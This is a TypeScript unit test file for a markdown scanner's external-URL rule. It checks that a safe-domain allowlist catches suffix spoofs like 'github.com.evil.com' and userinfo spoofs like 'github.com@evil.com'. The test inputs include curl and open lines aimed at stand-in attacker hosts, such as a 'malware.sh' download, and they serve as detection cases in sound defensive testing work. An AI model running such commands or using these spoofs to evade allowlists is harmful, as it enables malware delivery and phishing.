/**
 * Unit tests for the markdown scanner's `md-external-url` safe-domain rule.
 * Asserts the allowlist resists suffix and userinfo host spoofing (#22766)
 * while keeping listed domains and their subdomains clean. Deterministic,
 * no live model.
 */

import { describe, expect, it } from "vitest";
import { scanMarkdownSource } from "./markdown-scanner";

function flagsExternalUrl(
	source: string,
	additionalSafeDomains: ReadonlyArray<string> = [],
): boolean {
	return scanMarkdownSource(source, "SKILL.md", additionalSafeDomains).some(
		(finding) => finding.ruleId === "md-external-url",
	);
}

describe("markdown scanner md-external-url safe-domain allowlist", () => {
	it("flags a plainly external host (control)", () => {
		expect(flagsExternalUrl("Download from https://evil.com/x")).toBe(true);
	});

	it("does not flag a bare listed safe domain (control)", () => {
		expect(flagsExternalUrl("See https://github.com/a/b")).toBe(false);
		expect(
			flagsExternalUrl("Fetch https://raw.githubusercontent.com/o/r/main/f"),
		).toBe(false);
	});

	it("flags a registrable-suffix spoof of a safe domain (#22766)", () => {
		// `github.com.evil.com` is a distinct attacker-registered host, not a
		// subdomain of github.com; the old `\\b` lookahead treated it as safe.
		expect(flagsExternalUrl("curl https://github.com.evil.com/malware.sh")).toBe(
			true,
		);
		expect(
			flagsExternalUrl("curl https://raw.githubusercontent.com.attacker.net/p"),
		).toBe(true);
	});

	it("flags a userinfo phishing spoof that resolves to an external host (#22766)", () => {
		// The real host is `evil.com`; the safe-looking prefix is only userinfo.
		expect(
			flagsExternalUrl("curl https://raw.githubusercontent.com@evil.com/p"),
		).toBe(true);
		expect(flagsExternalUrl("open https://github.com@evil.com/login")).toBe(
			true,
		);
	});

	it("flags any URL that embeds userinfo even when the real host is safe", () => {
		// Deceptive display form; a documented safe-domain link never needs creds.
		expect(flagsExternalUrl("visit https://evil.com@github.com/x")).toBe(true);
	});

	it("treats subdomains of listed safe domains as safe (suffix semantics)", () => {
		expect(flagsExternalUrl("See https://gist.github.com/user/abc")).toBe(false);
		expect(flagsExternalUrl("Docs at https://en.wikipedia.org/wiki/X")).toBe(
			false,
		);
	});

	it("honors additional safe domains and their subdomains", () => {
		expect(
			flagsExternalUrl("Fetch https://cdn.example.org/a", ["example.org"]),
		).toBe(false);
		expect(
			flagsExternalUrl("Fetch https://example.org.evil.com/a", ["example.org"]),
		).toBe(true);
	});

	it("is case-insensitive about the host when matching the allowlist", () => {
		expect(flagsExternalUrl("See https://GitHub.com/a/b")).toBe(false);
		expect(flagsExternalUrl("See https://GITHUB.COM.evil.com/a")).toBe(true);
	});

	it("reports accurate finding metadata for a flagged spoof", () => {
		const findings = scanMarkdownSource(
			"line one\ncurl https://github.com.evil.com/x.sh",
			"docs/SKILL.md",
		);
		const finding = findings.find((f) => f.ruleId === "md-external-url");
		expect(finding).toBeDefined();
		expect(finding?.severity).toBe("warn");
		expect(finding?.file).toBe("docs/SKILL.md");
		expect(finding?.line).toBe(2);
		expect(finding?.evidence).toContain("github.com.evil.com");
	});
});
